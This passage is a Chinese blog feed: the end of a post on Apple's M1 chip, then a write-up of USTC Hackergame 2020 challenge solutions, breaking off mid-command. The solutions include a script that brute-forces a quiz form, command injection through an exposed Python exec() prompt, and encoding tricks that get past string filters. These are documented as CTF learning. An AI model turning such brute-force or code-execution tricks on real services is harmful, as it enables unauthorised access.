SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 